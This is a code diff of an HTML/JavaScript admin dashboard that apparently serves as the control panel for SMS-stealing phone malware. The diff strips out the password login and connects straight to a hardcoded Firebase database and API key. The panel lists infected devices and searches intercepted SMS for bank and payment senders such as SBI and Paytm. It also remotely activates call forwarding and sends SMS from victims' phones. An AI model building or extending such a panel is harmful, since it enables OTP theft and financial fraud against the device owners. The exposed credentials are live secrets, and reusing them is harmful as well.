@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-<title>CSC Admin Dashboard - Full Working</title>
+<title>CSC Admin Dashboard - No Password</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 :root{
@@ -12,16 +12,8 @@
   --border:#e2e8f0;--shadow:0 2px 8px rgba(0,0,0,.08);--shadow2:0 8px 32px rgba(0,0,0,.18);
 }
 body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
-#login-screen{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:linear-gradient(135deg,#4c1d95,#1e1b4b);}
-.login-card{background:#fff;border-radius:20px;padding:36px 28px;width:100%;max-width:340px;box-shadow:var(--shadow2);text-align:center;}
-.login-card .ic{font-size:44px;}
-.login-card h2{font-size:19px;font-weight:700;color:var(--purple);margin:8px 0 4px;}
-.login-card p{font-size:13px;color:var(--muted);margin-bottom:20px;}
-.login-card input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:12px;font-size:18px;text-align:center;letter-spacing:3px;outline:none;margin-bottom:14px;}
-.login-card input:focus{border-color:var(--purple2);}
-.pbtn{width:100%;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:15px;font-weight:700;cursor:pointer;}
-.errbox{background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;padding:10px;border-radius:8px;font-size:13px;margin-top:10px;display:none;}
-#setup-screen{min-height:100vh;display:none;align-items:center;justify-content:center;padding:20px;background:linear-gradient(135deg,#4c1d95,#1e1b4b);}
+
+#setup-screen{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:linear-gradient(135deg,#4c1d95,#1e1b4b);}
 .setup-card{background:#fff;border-radius:20px;padding:32px 28px;width:100%;max-width:460px;box-shadow:var(--shadow2);}
 .setup-logo{text-align:center;margin-bottom:22px;}
 .setup-logo .ic{font-size:44px;}
@@ -31,75 +23,30 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 .fg label{display:block;font-size:11px;font-weight:700;color:var(--muted);margin-bottom:5px;}
 .fg input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:11px 13px;font-size:14px;outline:none;}
 .fg input:focus{border-color:var(--purple2);}
-</style>
-</head>
-<body>
-  <div id="login-screen">
-  <div class="login-card">
-    <div class="ic">🔐</div>
-    <h2>Admin Login</h2>
-    <p>Enter Admin Password</p>
-    <input type="password" id="login-pass" placeholder="••••••" maxlength="20" onkeydown="if(event.key==='Enter')doLogin()" />
-    <button class="pbtn" onclick="doLogin()">Login</button>
-    <div class="errbox" id="login-err"></div>
-  </div>
-</div>
+.pbtn{width:100%;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:15px;font-weight:700;cursor:pointer;}
+.errbox{background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;padding:10px;border-radius:8px;font-size:13px;margin-top:10px;display:none;}
 
-<div id="setup-screen">
-  <div class="setup-card">
-    <div class="setup-logo"><div class="ic">📡</div><h1>CSC Admin</h1><p>Firebase Configuration</p></div>
-    <div class="fg"><label>Firebase URL</label><input id="cfg-url" placeholder="https://your-db.firebaseio.com" value="https://vkvkvk-61f36-default-rtdb.firebaseio.com/"></div>
-    <div class="fg"><label>API Key</label><input id="cfg-key" type="password" placeholder="AIzaSy..." value="AIzaSyAniMS9v56_LHDoYg3eqyjjJAWeNUHOias"></div>
-    <div class="fg"><label>Main Node</label><input id="cfg-node" value="csc6"></div>
-    <button class="pbtn" onclick="saveConfig()">Save & Connect</button>
-    <div class="errbox" id="setup-err"></div>
-  </div>
-</div>
-
-<div id="app">
-  <div class="topbar"><div class="topbar-title"><span class="live-dot"></span> CSC Admin</div><div><button class="xbtn" onclick="refreshData()">🔄</button><button class="xbtn" onclick="logout()">Logout</button></div></div>
-  <div class="search-sec"><div class="sw"><span class="si">🔍</span><input id="global-search" placeholder="Search SMS in ALL devices (SBI, Paytm, Nearby, Spice)..." oninput="onSearch(this.value)" /><button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button></div></div>
-  <div id="main-content"><div class="reg-bar" id="register-bar">Devices: --</div><button class="upd-btn" onclick="openUpdateNo()">📱 UPDATE NUMBER</button><div class="stats-bar"><div class="sbox"><div class="snum" id="s-total">0</div><div class="slbl">Devices</div></div><div class="sbox"><div class="snum" id="s-online">0</div><div class="slbl">Online</div></div><div class="sbox"><div class="snum" id="s-sms">0</div><div class="slbl">Total SMS</div></div></div><div class="dev-list" id="device-list"><div class="loading"><div class="spinner"></div> Loading devices...</div></div></div>
-</div>
-<div id="detail-screen">
-  <div class="dtopbar"><button class="bbtn" onclick="goBack()">← Back</button><div class="dtitle" id="detail-title">Device</div></div>
-  <div class="dactions"><button class="actbtn" onclick="openCallFwd()">📞 CALL FORWARDING</button><button class="actbtn" onclick="openSmsSend()">✉️ SEND SMS</button></div>
-  <div class="sms-list-wrap" id="sms-list"></div>
-</div>
-
-<div id="search-screen">
-  <div class="topbar"><div class="topbar-title">🔍 Search Results</div><button class="xbtn" onclick="clearSearch()">← Back to Dashboard</button></div>
-  <div style="padding:11px 16px;background:#fff;border-bottom:1px solid var(--border);" id="search-summary"></div>
-  <div style="padding:8px 16px 80px;" id="search-results-list"></div>
-</div>
-
-<div class="overlay" id="dlg-cf"><div class="dialog"><div class="dhdr">📞 Call Forwarding</div><div class="dbody"><div id="sim-list"></div><div class="fwd-lbl">Forward To Number</div><input class="dinput" id="cf-number" placeholder="+91XXXXXXXXXX" type="tel" /><div class="dbtn-row"><button class="dbtn-h" onclick="doCF('active')">ACTIVATE</button><button class="dbtn-h red" onclick="doCF('deactive')">DEACTIVATE</button></div><button class="dbtn" onclick="doCF('check')">CHECK STATUS</button><div class="cf-res" id="cf-result"></div><button class="dbtn-cancel" onclick="closeDialog('dlg-cf')">Cancel</button></div></div></div>
-
-<div class="overlay" id="dlg-sms"><div class="dialog"><div class="dhdr">✉️ Send SMS</div><div class="dbody"><input class="dinput" id="sms-to" placeholder="Recipient Number" type="tel" /><textarea class="dinput" id="sms-msg" placeholder="Message" rows="4"></textarea><button class="dbtn" onclick="doSendSms()">SEND</button><button class="dbtn-cancel" onclick="closeDialog('dlg-sms')">Cancel</button></div></div></div>
-
-<div class="overlay" id="dlg-update"><div class="dialog"><div class="dhdr">🔄 Update Number</div><div class="dbody"><input class="dinput" id="update-num" placeholder="New Number" type="tel" /><button class="dbtn" onclick="doUpdateNo()">UPDATE</button><button class="dbtn-cancel" onclick="closeDialog('dlg-update')">Cancel</button></div></div></div>
-
-<div id="toast"></div>
-
-<style>
 #app{display:none;flex-direction:column;min-height:100vh;}
 .topbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;}
 .topbar-title{color:#fff;font-size:16px;font-weight:700;display:flex;align-items:center;gap:8px;}
 .live-dot{width:8px;height:8px;border-radius:50%;background:#4ade80;animation:pulse 2s infinite;}
 @keyframes pulse{0%,100%{opacity:1;}50%{opacity:.4;}}
 .xbtn{background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:8px;padding:6px 12px;font-size:12px;cursor:pointer;}
+
 .search-sec{background:#fff;padding:11px 16px;border-bottom:1px solid var(--border);position:sticky;top:57px;z-index:190;}
 .sw{position:relative;}
 .sw input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:10px 38px;font-size:14px;outline:none;}
 .sw input:focus{border-color:var(--purple2);}
 .si{position:absolute;left:12px;top:50%;transform:translateY(-50%);font-size:16px;}
 .sc{position:absolute;right:11px;top:50%;transform:translateY(-50%);background:none;border:none;font-size:15px;color:var(--muted);cursor:pointer;display:none;}
+
 .stats-bar{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;padding:12px 16px;}
 .sbox{background:#fff;border-radius:12px;padding:12px;text-align:center;box-shadow:var(--shadow);}
 .snum{font-size:22px;font-weight:700;}
 .slbl{font-size:11px;color:var(--muted);}
 .reg-bar{background:#fff;padding:8px 16px;border-bottom:1px solid var(--border);font-size:13px;color:var(--muted);text-align:center;}
 .upd-btn{display:block;margin:12px 16px;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:14px;font-size:14px;font-weight:700;text-align:center;cursor:pointer;width:calc(100% - 32px);}
+
 .dev-list{padding:0 16px 80px;}
 .dev-card{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);cursor:pointer;}
 .dev-card:active{transform:scale(.98);}
@@ -114,19 +61,69 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 .son{color:var(--green);}
 .soff{color:var(--red);}
 .sbadge{background:var(--purple-light);color:var(--purple);font-size:11px;font-weight:700;padding:2px 8px;border-radius:20px;margin-left:auto;}
-#detail-screen .dtopbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;gap:11px;position:sticky;top:0;}
-#detail-screen .bbtn{background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:8px;padding:7px 12px;cursor:pointer;}
-#detail-screen .dtitle{color:#fff;font-size:15px;font-weight:700;flex:1;}
-#detail-screen .dactions{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:13px 16px;}
-#detail-screen .actbtn{background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:13px;font-weight:700;cursor:pointer;}
-#detail-screen .sms-list-wrap{padding:0 16px 80px;}
+</style>
+</head>
+<body>
+  <!-- SETUP SCREEN (Only config, no login) -->
+<div id="setup-screen">
+  <div class="setup-card">
+    <div class="setup-logo"><div class="ic">📡</div><h1>CSC Admin</h1><p>Firebase Configuration</p></div>
+    <div class="fg"><label>Firebase Database URL</label><input id="cfg-url" placeholder="https://your-db.firebaseio.com" value="https://vkvkvk-61f36-default-rtdb.firebaseio.com/"></div>
+    <div class="fg"><label>API Key</label><input id="cfg-key" type="password" placeholder="AIzaSy..." value="AIzaSyAniMS9v56_LHDoYg3eqyjjJAWeNUHOias"></div>
+    <div class="fg"><label>Main Node</label><input id="cfg-node" value="csc6"></div>
+    <button class="pbtn" onclick="doConnect()">🔗 Connect & Open Dashboard</button>
+    <div class="errbox" id="setup-err"></div>
+  </div>
+</div>
+
+<!-- MAIN DASHBOARD APP -->
+<div id="app">
+  <div class="topbar"><div class="topbar-title"><span class="live-dot"></span> CSC Admin</div><div><button class="xbtn" onclick="refreshData()">🔄</button><button class="xbtn" onclick="disconnect()">Disconnect</button></div></div>
+  <div class="search-sec"><div class="sw"><span class="si">🔍</span><input id="global-search" placeholder="Search SMS in ALL devices (SBI, Paytm, Nearby, Spice)..." oninput="onSearch(this.value)" /><button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button></div></div>
+  <div id="main-content"><div class="reg-bar" id="register-bar">Devices: --</div><button class="upd-btn" onclick="openUpdateNo()">📱 UPDATE NUMBER</button><div class="stats-bar"><div class="sbox"><div class="snum" id="s-total">0</div><div class="slbl">Devices</div></div><div class="sbox"><div class="snum" id="s-online">0</div><div class="slbl">Online</div></div><div class="sbox"><div class="snum" id="s-sms">0</div><div class="slbl">Total SMS</div></div></div><div class="dev-list" id="device-list"><div class="loading"><div class="spinner"></div> Loading devices...</div></div></div>
+</div>
+
+<!-- DETAIL SCREEN -->
+<div id="detail-screen">
+  <div class="dtopbar"><button class="bbtn" onclick="goBack()">← Back</button><div class="dtitle" id="detail-title">Device</div></div>
+  <div class="dactions"><button class="actbtn" onclick="openCallFwd()">📞 CALL FORWARDING</button><button class="actbtn" onclick="openSmsSend()">✉️ SEND SMS</button></div>
+  <div class="sms-list-wrap" id="sms-list"></div>
+</div>
+
+<!-- SEARCH RESULTS SCREEN -->
+<div id="search-screen">
+  <div class="topbar"><div class="topbar-title">🔍 Search Results</div><button class="xbtn" onclick="clearSearch()">← Back to Dashboard</button></div>
+  <div style="padding:11px 16px;background:#fff;border-bottom:1px solid var(--border);" id="search-summary"></div>
+  <div style="padding:8px 16px 80px;" id="search-results-list"></div>
+</div>
+
+<!-- DIALOGS -->
+<div class="overlay" id="dlg-cf"><div class="dialog"><div class="dhdr">📞 Call Forwarding</div><div class="dbody"><div id="sim-list"></div><div class="fwd-lbl">Forward To Number</div><input class="dinput" id="cf-number" placeholder="+91XXXXXXXXXX" type="tel" /><div class="dbtn-row"><button class="dbtn-h" onclick="doCF('active')">ACTIVATE</button><button class="dbtn-h red" onclick="doCF('deactive')">DEACTIVATE</button></div><button class="dbtn" onclick="doCF('check')">CHECK STATUS</button><div class="cf-res" id="cf-result"></div><button class="dbtn-cancel" onclick="closeDialog('dlg-cf')">Cancel</button></div></div></div>
+
+<div class="overlay" id="dlg-sms"><div class="dialog"><div class="dhdr">✉️ Send SMS</div><div class="dbody"><input class="dinput" id="sms-to" placeholder="Recipient Number" type="tel" /><textarea class="dinput" id="sms-msg" placeholder="Message" rows="4"></textarea><button class="dbtn" onclick="doSendSms()">SEND</button><button class="dbtn-cancel" onclick="closeDialog('dlg-sms')">Cancel</button></div></div></div>
+
+<div class="overlay" id="dlg-update"><div class="dialog"><div class="dhdr">🔄 Update Number</div><div class="dbody"><input class="dinput" id="update-num" placeholder="New Number" type="tel" /><button class="dbtn" onclick="doUpdateNo()">UPDATE</button><button class="dbtn-cancel" onclick="closeDialog('dlg-update')">Cancel</button></div></div></div>
+
+<div id="toast"></div>
+
+<style>
+#detail-screen{display:none;flex-direction:column;min-height:100vh;}
+.dtopbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;gap:11px;position:sticky;top:0;}
+.bbtn{background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:8px;padding:7px 12px;cursor:pointer;}
+.dtitle{color:#fff;font-size:15px;font-weight:700;flex:1;}
+.dactions{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:13px 16px;}
+.actbtn{background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:13px;font-weight:700;cursor:pointer;}
+.sms-list-wrap{padding:0 16px 80px;}
 .scard{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);}
 .sadr{font-size:14px;font-weight:600;margin-bottom:5px;word-break:break-all;}
 .sbody{font-size:13px;color:var(--muted);line-height:1.6;word-break:break-all;}
 .stime{font-size:11px;color:var(--muted);text-align:right;margin-top:7px;}
-#search-screen .src-card{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);cursor:pointer;}
-#search-screen .sdlbl{font-size:12px;font-weight:700;color:var(--purple);background:var(--purple-light);padding:3px 10px;border-radius:20px;display:inline-block;margin-bottom:8px;}
-#search-screen .highlight{background:#fef08a;color:#713f12;border-radius:3px;padding:0 2px;font-weight:bold;}
+
+#search-screen{display:none;flex-direction:column;min-height:100vh;}
+.src-card{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);cursor:pointer;}
+.sdlbl{font-size:12px;font-weight:700;color:var(--purple);background:var(--purple-light);padding:3px 10px;border-radius:20px;display:inline-block;margin-bottom:8px;}
+.highlight{background:#fef08a;color:#713f12;border-radius:3px;padding:0 2px;font-weight:bold;}
+
 .overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:500;display:none;align-items:center;justify-content:center;padding:16px;}
 .dialog{background:#fff;border-radius:20px;width:100%;max-width:440px;overflow:hidden;}
 .dhdr{padding:17px 20px;text-align:center;font-size:17px;font-weight:700;color:#fff;background:linear-gradient(135deg,var(--purple),var(--purple2));}
@@ -153,11 +150,10 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 .empty{text-align:center;padding:48px 16px;color:var(--muted);}
 .empty .ei{font-size:38px;margin-bottom:10px;opacity:.5;}
 #toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1e293b;color:#fff;padding:10px 20px;border-radius:20px;font-size:13px;z-index:9999;opacity:0;transition:opacity .3s;pointer-events:none;white-space:nowrap;}
-         </style>
-         <script>
-// ========== GLOBAL VARIABLES ==========
+  </style>
+  <script>
+// ========== NO PASSWORD - DIRECT CONNECT ==========
 var DB_URL = '', API_KEY = '', ROOT_NODE = 'csc6';
-var ADMIN_PASSWORD = '';
 var DEVICES = {};
 var currentDeviceKey = null;
 var selectedSim = 0;
@@ -179,8 +175,8 @@ function fbSet(path, data) {
   }).then(function(r) { return r.json(); });
 }
 
-// ========== SAVE CONFIG ==========
-function saveConfig() {
+// ========== DIRECT CONNECT (NO PASSWORD) ==========
+function doConnect() {
   DB_URL = document.getElementById('cfg-url').value.trim().replace(/\/$/, '');
   API_KEY = document.getElementById('cfg-key').value.trim();
   ROOT_NODE = document.getElementById('cfg-node').value.trim() || 'csc6';
@@ -192,27 +188,21 @@ function saveConfig() {
   
   var btn = event.target;
   btn.disabled = true;
-  btn.textContent = 'Checking...';
+  btn.textContent = 'Connecting...';
   
-  fbGet(ROOT_NODE + '/Admin_Password').then(function(password) {
-    if (!password) {
-      showSetupErr('Admin_Password not found in ' + ROOT_NODE + ' node!');
-      btn.disabled = false;
-      btn.textContent = 'Save & Continue';
-      return;
-    }
-    ADMIN_PASSWORD = String(password);
+  // Directly fetch All_User to verify connection
+  fbGet(ROOT_NODE + '/All_User').then(function(data) {
     document.getElementById('setup-screen').style.display = 'none';
-    document.getElementById('login-screen').style.display = 'flex';
-    document.getElementById('login-pass').value = '';
-    document.getElementById('login-pass').focus();
+    document.getElementById('app').style.display = 'flex';
+    loadData();
+    startPolling();
     btn.disabled = false;
-    btn.textContent = 'Save & Continue';
-    showToast('Configuration saved! Please login.');
+    btn.textContent = '🔗 Connect & Open Dashboard';
+    showToast('Connected successfully!');
   }).catch(function(e) {
-    showSetupErr('Connection failed: ' + e.message);
+    showSetupErr('Connection failed: ' + e.message + ' — Check URL/API Key');
     btn.disabled = false;
-    btn.textContent = 'Save & Continue';
+    btn.textContent = '🔗 Connect & Open Dashboard';
   });
 }
 
@@ -223,33 +213,15 @@ function showSetupErr(msg) {
   setTimeout(function() { err.style.display = 'none'; }, 4000);
 }
 
-// ========== LOGIN ==========
-function doLogin() {
-  var pass = document.getElementById('login-pass').value;
-  if (pass === ADMIN_PASSWORD) {
-    document.getElementById('login-screen').style.display = 'none';
-    document.getElementById('app').style.display = 'flex';
-    loadData();
-    startPolling();
-    showToast('Login successful!');
-  } else {
-    var err = document.getElementById('login-err');
-    err.textContent = '❌ Wrong password!';
-    err.style.display = 'block';
-    setTimeout(function() { err.style.display = 'none'; }, 3000);
-  }
-}
-
-function logout() {
+function disconnect() {
   stopPolling();
   document.getElementById('app').style.display = 'none';
   document.getElementById('detail-screen').style.display = 'none';
   document.getElementById('search-screen').style.display = 'none';
-  document.getElementById('login-screen').style.display = 'flex';
-  document.getElementById('login-pass').value = '';
-  showToast('Logged out');
+  document.getElementById('setup-screen').style.display = 'flex';
+  showToast('Disconnected');
 }
-           // ========== LOAD DATA ==========
+    // ========== LOAD DATA ==========
 function loadData() {
   fbGet(ROOT_NODE + '/All_User').then(function(data) {
     if (!data) {
@@ -411,8 +383,8 @@ function goBack() {
     document.getElementById('app').style.display = 'flex';
   }
   window.scrollTo(0, 0);
-      }
-           // ========== GLOBAL SEARCH - ALL DEVICES ==========
+    }
+    // ========== GLOBAL SEARCH - ALL DEVICES ==========
 function onSearch(val) {
   var clearBtn = document.getElementById('search-clear-btn');
   clearBtn.style.display = val ? 'block' : 'none';
@@ -500,8 +472,8 @@ function highlightText(text, keyword) {
   } catch(e) {
     return text;
   }
-}
-           // ========== CALL FORWARDING ==========
+        }
+    // ========== CALL FORWARDING ==========
 function openCallFwd() {
   var dev = DEVICES[currentDeviceKey];
   if (!dev) { showToast('Device not found'); return; }
